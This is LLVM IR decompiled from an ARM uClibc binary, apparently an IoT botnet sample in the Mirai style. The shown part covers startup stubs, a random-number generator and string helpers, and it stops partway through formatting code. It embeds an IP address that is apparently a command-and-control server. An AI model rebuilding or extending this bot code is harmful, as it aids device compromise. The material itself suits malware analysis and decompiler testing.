source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1f00c.13 = global i32 0
@global_var_9db0.17 = constant i32 -509558771
@global_var_1f324.20 = global i32 0
@global_var_1f328.22 = global i32 0
@global_var_1f32c.24 = local_unnamed_addr global i32 0
@global_var_1f330.26 = global i32 0
@global_var_15770.32 = constant [30 x i8] c"fjh249f20348rh13rf8j13ru310rt\00"
@global_var_15790.35 = constant [7 x i8] c"(null)\00"
@global_var_1f09c = external local_unnamed_addr global i32
@global_var_1f320.40 = global i32 0
@global_var_1f318.42 = global i32 0
@global_var_1f31c.43 = local_unnamed_addr global i32 0
@global_var_21568.45 = global i32 0
@global_var_15798.47 = constant [6 x i32] %wide-string
@global_var_1579c.49 = constant [5 x i32] %wide-string
@global_var_157a0.51 = constant [4 x i32] %wide-string
@global_var_1f094.56 = local_unnamed_addr global i32 -1
@global_var_15760.58 = constant [14 x i8] c"66.172.10.124\00"
@global_var_1f090.59 = global [14 x i8]* @global_var_15760.58
@global_var_157a4.62 = constant [3 x i32] %wide-string
@global_var_157a8.66 = constant i32 32
@global_var_1f010.69 = global i32 0
@global_var_abec.74 = constant i32 -456978431
@global_var_b248.94 = constant i32 -478871519
@global_var_bbbc.103 = constant i32 -382906384
@global_var_aa84.112 = constant i32 -509591552
@global_var_c164.118 = constant i32 -442564540
@global_var_1f31d.149 = global i32 0
@global_var_cb20.173 = constant i32 -369098421
@global_var_bfec.189 = constant i32 -442543860
@global_var_aca0.198 = constant i32 -369094574
@global_var_d4ec.211 = constant i32 -335545085
@global_var_d954.224 = constant i32 -443088884
@global_var_ff00.235 = constant i32 61740
@global_var_bd70.236 = constant i32 -382909968
@global_var_ea18.244 = constant i32 -382906384
@global_var_20003.253 = global i32 0
@global_var_20000.254 = global i32 0
@global_var_e4f8.264 = constant i32 -509607926
@global_var_e6c8.274 = constant i32 -382910448
@global_var_10450.275 = constant i32 -382909968
@global_var_e83c.285 = constant i32 -509607928
@global_var_fba8.327 = constant i32 -478805983
@global_var_10168.334 = constant i32 -382909456
@global_var_aab0.352 = constant i32 -382910336
@global_var_11580.357 = constant i32 -442695584
@global_var_11b48.366 = constant i32 -382910224
@global_var_13a68.387 = constant i32 -382910224
@global_var_14f6c.442 = constant i32 -504313148
@global_var_14f54.443 = constant i32 -483131392
@global_var_14e00.444 = constant i32 -481229311
@global_var_14fdc.445 = constant i32 -477817729
@global_var_150dc.446 = constant i32 -476034303
@global_var_15318.447 = constant i32 -516685812
@global_var_1520c.448 = constant i32 -905969571
@global_var_15140.449 = constant i32 -528203771
@global_var_153a0.450 = constant i32 -478079873
@global_var_15384.451 = constant i32 -534704125
@global_var_15334.452 = constant i32 -534704125
@global_var_152cc.453 = constant i32 -483131392
@global_var_1f2f8.3 = external global i8*

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_1f2f8.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_1f2f8.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_1f2f8.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_1f00c.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_1f00c.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1f00c.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9db0.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 87888, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8200 = call i32 @__GI_time(i32* null)
  store i32 %v2_8200, i32* @r0, align 4
  store i32 %v2_8200, i32* @global_var_1f324.20, align 4
  %v0_8214 = call i32 @__GI_getpid()
  store i32 %v0_8214, i32* @r0, align 4
  %v0_821c = call i32 @getppid()
  %v2_8224 = xor i32 %v0_8214, %v0_821c
  store i32 %v2_8224, i32* @global_var_1f328.22, align 4
  %v0_8234 = call i32 @clock()
  store i32 %v0_8234, i32* @global_var_1f32c.24, align 4
  %v2_8254 = load i32, i32* @global_var_1f328.22, align 4
  %v2_8258 = xor i32 %v2_8254, %v0_8234
  store i32 %v2_8258, i32* @global_var_1f330.26, align 4
  ret i32 %v0_8234

; uselistorder directives
  uselistorder i32 %v0_8234, { 1, 0, 2 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_8294 = load i32, i32* @global_var_1f324.20, align 4
  %v3_82a0 = mul i32 %v2_8294, 2048
  %v2_82a8 = xor i32 %v3_82a0, %v2_8294
  %v3_82b4 = udiv i32 %v2_82a8, 256
  %v2_82c8 = load i32, i32* @global_var_1f328.22, align 4
  store i32 %v2_82c8, i32* @global_var_1f324.20, align 4
  %v2_82d8 = load i32, i32* @global_var_1f32c.24, align 4
  store i32 %v2_82d8, i32* @global_var_1f328.22, align 4
  %v2_82e8 = load i32, i32* @global_var_1f330.26, align 4
  store i32 %v2_82e8, i32* @global_var_1f32c.24, align 4
  %v3_82fc = udiv i32 %v2_82e8, 524288
  %v2_8308 = xor i32 %v3_82b4, %v2_82a8
  %v2_82bc = xor i32 %v2_8308, %v2_82e8
  %v2_8320 = xor i32 %v2_82bc, %v3_82fc
  store i32 %v2_8320, i32* @global_var_1f330.26, align 4
  ret i32 %v2_8320

; uselistorder directives
  uselistorder i32 %v2_82e8, { 1, 0, 2 }
  uselistorder i32 %v2_82a8, { 1, 0 }
  uselistorder i32 %v2_8294, { 1, 0 }
  uselistorder i32* @global_var_1f330.26, { 0, 2, 1 }
  uselistorder i32* @global_var_1f32c.24, { 0, 2, 1 }
  uselistorder i32* @global_var_1f328.22, { 0, 2, 3, 1 }
  uselistorder i32* @global_var_1f324.20, { 0, 2, 1 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8364 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_841c3 = icmp sgt i32 %arg2, 0
  br i1 %v5_841c3, label %dec_label_pc_8370, label %dec_label_pc_8420

dec_label_pc_8370:                                ; preds = %entry, %dec_label_pc_8414.backedge
  %v3_83a8 = phi i32 [ %v3_8414.be, %dec_label_pc_8414.backedge ], [ %arg2, %entry ]
  %stack_var_-28.0.in4 = phi i32 [ %stack_var_-28.0.in.be, %dec_label_pc_8414.backedge ], [ %v0_8364, %entry ]
  %v7_8378 = icmp slt i32 %v3_83a8, 4
  br i1 %v7_8378, label %dec_label_pc_83a8, label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_8370
  %v0_8380 = call i32 @rand_next()
  store i32 %v0_8380, i32* %r0.global-to-local, align 4
  %v2_8388 = inttoptr i32 %stack_var_-28.0.in4 to i32*
  store i32 %v0_8380, i32* %v2_8388, align 4
  %v1_8390 = add i32 %stack_var_-28.0.in4, 4
  %v3_8398 = load i32, i32* %stack_var_-32, align 4
  %v1_839c = add i32 %v3_8398, -4
  store i32 %v1_839c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8414.backedge

dec_label_pc_83a8:                                ; preds = %dec_label_pc_8370
  %v7_83b0 = icmp slt i32 %v3_83a8, 2
  br i1 %v7_83b0, label %dec_label_pc_83e8, label %dec_label_pc_83b4

dec_label_pc_83b4:                                ; preds = %dec_label_pc_83a8
  %v0_83b8 = call i32 @rand_next()
  store i32 %v0_83b8, i32* %r0.global-to-local, align 4
  %v1_83c8 = trunc i32 %v0_83b8 to i16
  %v3_83c8 = inttoptr i32 %stack_var_-28.0.in4 to i16*
  store i16 %v1_83c8, i16* %v3_83c8, align 2
  %v1_83d0 = add i32 %stack_var_-28.0.in4, 2
  %v3_83d8 = load i32, i32* %stack_var_-32, align 4
  %v1_83dc = add i32 %v3_83d8, -2
  store i32 %v1_83dc, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8414.backedge

dec_label_pc_83e8:                                ; preds = %dec_label_pc_83a8
  %v0_83e8 = call i32 @rand_next()
  store i32 %v0_83e8, i32* %r0.global-to-local, align 4
  %v1_83f8 = trunc i32 %v0_83e8 to i8
  %v3_83f8 = inttoptr i32 %stack_var_-28.0.in4 to i8*
  store i8 %v1_83f8, i8* %v3_83f8, align 1
  %v1_8400 = add i32 %stack_var_-28.0.in4, 1
  %v3_8408 = load i32, i32* %stack_var_-32, align 4
  %v1_840c = add i32 %v3_8408, -1
  store i32 %v1_840c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8414.backedge

dec_label_pc_8414.backedge:                       ; preds = %dec_label_pc_83e8, %dec_label_pc_837c, %dec_label_pc_83b4
  %v3_8414.be = phi i32 [ %v1_83dc, %dec_label_pc_83b4 ], [ %v1_839c, %dec_label_pc_837c ], [ %v1_840c, %dec_label_pc_83e8 ]
  %stack_var_-28.0.in.be = phi i32 [ %v1_83d0, %dec_label_pc_83b4 ], [ %v1_8390, %dec_label_pc_837c ], [ %v1_8400, %dec_label_pc_83e8 ]
  %v5_841c = icmp sgt i32 %v3_8414.be, 0
  br i1 %v5_841c, label %dec_label_pc_8370, label %dec_label_pc_8414.dec_label_pc_8420_crit_edge

dec_label_pc_8414.dec_label_pc_8420_crit_edge:    ; preds = %dec_label_pc_8414.backedge
  %v1_8428.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_8414.dec_label_pc_8420_crit_edge, %entry
  %v1_8428 = phi i32 [ %v1_8428.pre, %dec_label_pc_8414.dec_label_pc_8420_crit_edge ], [ %v0_8364, %entry ]
  ret i32 %v1_8428

; uselistorder directives
  uselistorder i32 %v3_8414.be, { 1, 0 }
  uselistorder i32 %stack_var_-28.0.in4, { 4, 5, 3, 0, 2, 1 }
  uselistorder i32 %v0_8364, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder label %dec_label_pc_8414.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8370, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-58 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8430 = load i32, i32* @fp, align 4
  store i32 %v3_8430, i32* %stack_var_-16, align 4
  store i32 ptrtoint ([30 x i8]* @global_var_15770.32 to i32), i32* @r3, align 4
  %v2_8448 = ptrtoint i32* %stack_var_-58 to i32
  store i32 30, i32* @ip, align 4
  store i32 %v2_8448, i32* @r0, align 4
  store i32 ptrtoint ([30 x i8]* @global_var_15770.32 to i32), i32* @r1, align 4
  store i32 30, i32* @r2, align 4
  %v0_845c = call i32 @memcpy()
  store i32 %v0_845c, i32* %r0.global-to-local, align 4
  %v5_855c18 = icmp sgt i32 %arg2, 0
  br i1 %v5_855c18, label %dec_label_pc_8464.lr.ph, label %dec_label_pc_8560

dec_label_pc_8464.lr.ph:                          ; preds = %entry
  %v13_8430 = ptrtoint i32* %stack_var_-16 to i32
  %v2_84b4 = add i32 %v13_8430, -42
  br label %dec_label_pc_8464

dec_label_pc_8464:                                ; preds = %dec_label_pc_8464.lr.ph, %dec_label_pc_8554.backedge
  %stack_var_-72.020 = phi i32 [ %arg2, %dec_label_pc_8464.lr.ph ], [ %stack_var_-72.0.be, %dec_label_pc_8554.backedge ]
  %stack_var_-68.119 = phi i8* [ %arg1, %dec_label_pc_8464.lr.ph ], [ %stack_var_-68.1.be, %dec_label_pc_8554.backedge ]
  %tmp36 = icmp ult i32 %stack_var_-72.020, 4
  %v0_84fc = call i32 @rand_next()
  store i32 %v0_84fc, i32* %r0.global-to-local, align 4
  br i1 %tmp36, label %dec_label_pc_84fc, label %dec_label_pc_8488.lr.ph

dec_label_pc_8488.lr.ph:                          ; preds = %dec_label_pc_8464
  %v5_8478 = trunc i32 %v0_84fc to i8
  br label %dec_label_pc_8488

dec_label_pc_8488:                                ; preds = %dec_label_pc_8488.lr.ph, %dec_label_pc_8488
  %storemerge915 = phi i32 [ 0, %dec_label_pc_8488.lr.ph ], [ %v1_84d8, %dec_label_pc_8488 ]
  %stack_var_-24.014 = phi i8 [ %v5_8478, %dec_label_pc_8488.lr.ph ], [ %v5_8498, %dec_label_pc_8488 ]
  %stack_var_-68.013 = phi i8* [ %stack_var_-68.119, %dec_label_pc_8488.lr.ph ], [ %v5_84d0, %dec_label_pc_8488 ]
  %v4_8488 = sext i8 %stack_var_-24.014 to i32
  %v3_8494 = udiv i32 %v4_8488, 256
  %v5_8498 = trunc i32 %v3_8494 to i8
  %div = udiv i8 %stack_var_-24.014, 8
  %v3_84a0 = zext i8 %div to i32
  %v2_84b8 = add i32 %v2_84b4, %v3_84a0
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v4_84c0 = ptrtoint i8* %stack_var_-68.013 to i32
  store i8 %v2_84bc, i8* %stack_var_-68.013, align 1
  %v1_84cc = add i32 %v4_84c0, 1
  %v5_84d0 = inttoptr i32 %v1_84cc to i8*
  %v1_84d8 = add i32 %storemerge915, 1
  %tmp37 = icmp ult i32 %v1_84d8, 4
  br i1 %tmp37, label %dec_label_pc_8488, label %dec_label_pc_84ec

dec_label_pc_84ec:                                ; preds = %dec_label_pc_8488
  %v1_84f0 = add i32 %stack_var_-72.020, -4
  br label %dec_label_pc_8554.backedge

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8464
  %v1_8508 = zext i32 %v0_84fc to i64
  %v4_8508 = mul nuw i64 %v1_8508, 2290649225
  %v3_850c3 = udiv i64 %v4_8508, 68719476736
  %v2_85185 = mul nuw nsw i64 %v3_850c3, 2
  %v2_8518 = trunc i64 %v2_85185 to i32
  %v3_851c7 = mul nuw nsw i64 %v3_850c3, 32
  %v3_851c = trunc i64 %v3_851c7 to i32
  %v2_852022 = sub i32 %v2_8518, %v3_851c
  %v2_8524 = add i32 %v2_852022, %v0_84fc
  %v4_8534 = ptrtoint i8* %stack_var_-68.119 to i32
  %v1_8538 = trunc i32 %v2_8524 to i8
  store i8 %v1_8538, i8* %stack_var_-68.119, align 1
  %v1_8540 = add i32 %v4_8534, 1
  %v5_8544 = inttoptr i32 %v1_8540 to i8*
  %v1_854c = add i32 %stack_var_-72.020, -1
  br label %dec_label_pc_8554.backedge

dec_label_pc_8554.backedge:                       ; preds = %dec_label_pc_84fc, %dec_label_pc_84ec
  %stack_var_-68.1.be = phi i8* [ %v5_84d0, %dec_label_pc_84ec ], [ %v5_8544, %dec_label_pc_84fc ]
  %stack_var_-72.0.be = phi i32 [ %v1_84f0, %dec_label_pc_84ec ], [ %v1_854c, %dec_label_pc_84fc ]
  %v5_855c = icmp sgt i32 %stack_var_-72.0.be, 0
  br i1 %v5_855c, label %dec_label_pc_8464, label %dec_label_pc_8554.dec_label_pc_8560_crit_edge

dec_label_pc_8554.dec_label_pc_8560_crit_edge:    ; preds = %dec_label_pc_8554.backedge
  %v1_8568.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %dec_label_pc_8554.dec_label_pc_8560_crit_edge, %entry
  %v1_8568 = phi i32 [ %v1_8568.pre, %dec_label_pc_8554.dec_label_pc_8560_crit_edge ], [ %v0_845c, %entry ]
  %v2_8564 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8564, i32* @fp, align 4
  ret i32 %v1_8568

; uselistorder directives
  uselistorder i32 %v0_84fc, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-72.020, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8488, { 1, 0 }
  uselistorder label %dec_label_pc_8464, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_85a0

dec_label_pc_8594:                                ; preds = %dec_label_pc_85a0
  %v4_85a0 = ptrtoint i8* %stack_var_-28.0 to i32
  %v1_85bc = add i32 %v4_85a0, 1
  %v5_85c0 = inttoptr i32 %v1_85bc to i8*
  %v1_8598 = add i32 %storemerge1, 1
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %entry, %dec_label_pc_8594
  %stack_var_-28.0 = phi i8* [ %arg1, %entry ], [ %v5_85c0, %dec_label_pc_8594 ]
  %storemerge1 = phi i32 [ 0, %entry ], [ %v1_8598, %dec_label_pc_8594 ]
  %v2_85a4 = load i8, i8* %stack_var_-28.0, align 1
  %v2_85a8 = icmp eq i8 %v2_85a4, 0
  br i1 %v2_85a8, label %dec_label_pc_85cc, label %dec_label_pc_8594

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85a0
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_86486 = icmp eq i32 %arg3, 0
  br i1 %v3_86486, label %dec_label_pc_8650, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %entry, %dec_label_pc_8610
  %v1_863c13.in = phi i32 [ %v1_863c13, %dec_label_pc_8610 ], [ %arg3, %entry ]
  %storemerge.in12 = phi i32 [ %v1_8630, %dec_label_pc_8610 ], [ %arg2, %entry ]
  %stack_var_-24.011 = phi i8* [ %v5_8628, %dec_label_pc_8610 ], [ %arg1, %entry ]
  %v1_863c13 = add i32 %v1_863c13.in, -1
  %storemerge = inttoptr i32 %storemerge.in12 to i8*
  %v2_8614 = load i8, i8* %storemerge, align 1
  %v4_8618 = ptrtoint i8* %stack_var_-24.011 to i32
  store i8 %v2_8614, i8* %stack_var_-24.011, align 1
  %v1_8624 = add i32 %v4_8618, 1
  %v5_8628 = inttoptr i32 %v1_8624 to i8*
  %v1_8630 = add i32 %storemerge.in12, 1
  %v3_8648 = icmp eq i32 %v1_863c13, 0
  br i1 %v3_8648, label %dec_label_pc_8650, label %dec_label_pc_8610

dec_label_pc_8650:                                ; preds = %dec_label_pc_8610, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %storemerge.in12, { 1, 0 }
  uselistorder label %dec_label_pc_8610, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8660 = load i32, i32* @fp, align 4
  %v1_8678 = inttoptr i32 %arg2 to i8*
  %v2_8678 = call i32 @util_strlen(i8* %v1_8678)
  %v1_8688 = add i32 %v2_8678, 1
  %v3_8698 = inttoptr i32 %arg1 to i8*
  %v4_8698 = call i32 @util_memcpy(i8* %v3_8698, i32 %arg2, i32 %v1_8688)
  store i32 %v3_8660, i32* @fp, align 4
  ret i32 %v2_8678
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_86c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_86cc = icmp eq i32 %v0_86c0, 0
  br i1 %v2_86cc, label %dec_label_pc_8700, label %dec_label_pc_86d4

dec_label_pc_86d4:                                ; preds = %entry
  %v1_86d8 = inttoptr i32 %v0_86c0 to i32*
  %v2_86d8 = load i32, i32* %v1_86d8, align 4
  %v1_86e4 = trunc i32 %arg2 to i8
  %v3_86e4 = inttoptr i32 %v2_86d8 to i8*
  store i8 %v1_86e4, i8* %v3_86e4, align 1
  %v2_86ec = load i32, i32* %v1_86d8, align 4
  %v1_86f0 = add i32 %v2_86ec, 1
  store i32 %v1_86f0, i32* %v1_86d8, align 4
  %v1_871c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8714

dec_label_pc_8700:                                ; preds = %entry
  %v2_86bc = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_8710 = call i32 @__GI_write(i32 1, i32 %v2_86bc)
  store i32 %v2_8710, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8714

dec_label_pc_8714:                                ; preds = %dec_label_pc_86d4, %dec_label_pc_8700
  %v1_871c = phi i32 [ %v1_871c.pre, %dec_label_pc_86d4 ], [ %v2_8710, %dec_label_pc_8700 ]
  ret i32 %v1_871c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8714, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_8724 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_87dc, label %dec_label_pc_875c

dec_label_pc_875c:                                ; preds = %entry
  %v2_878c19 = load i8, i8* %arg2, align 1
  %v2_879021 = icmp eq i8 %v2_878c19, 0
  br i1 %v2_879021, label %dec_label_pc_8798, label %dec_label_pc_8770

dec_label_pc_8770:                                ; preds = %dec_label_pc_875c, %dec_label_pc_8770
  %v4_878823 = phi i32 [ %v1_8780, %dec_label_pc_8770 ], [ %tmp, %dec_label_pc_875c ]
  %stack_var_-40.022 = phi i32 [ %v1_8774, %dec_label_pc_8770 ], [ 0, %dec_label_pc_875c ]
  %v1_8774 = add i32 %stack_var_-40.022, 1
  %v1_8780 = add i32 %v4_878823, 1
  %v5_8784 = inttoptr i32 %v1_8780 to i8*
  %v2_878c = load i8, i8* %v5_8784, align 1
  %v2_8790 = icmp eq i8 %v2_878c, 0
  br i1 %v2_8790, label %dec_label_pc_8798, label %dec_label_pc_8770

dec_label_pc_8798:                                ; preds = %dec_label_pc_8770, %dec_label_pc_875c
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_875c ], [ %v1_8774, %dec_label_pc_8770 ]
  %v5_87a4 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_87a4, label %dec_label_pc_87b4, label %dec_label_pc_87c4

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8798
  %v2_87bc = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_8798, %dec_label_pc_87b4
  %storemerge3 = phi i32 [ %v2_87bc, %dec_label_pc_87b4 ], [ 0, %dec_label_pc_8798 ]
  %v1_87c8 = and i32 %arg4, 2
  %v2_87cc = icmp eq i32 %v1_87c8, 0
  br i1 %v2_87cc, label %dec_label_pc_87dc, label %dec_label_pc_87d4

dec_label_pc_87d4:                                ; preds = %dec_label_pc_87c4
  br label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87c4, %entry, %dec_label_pc_87d4
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_87c4 ], [ %storemerge3, %dec_label_pc_87d4 ]
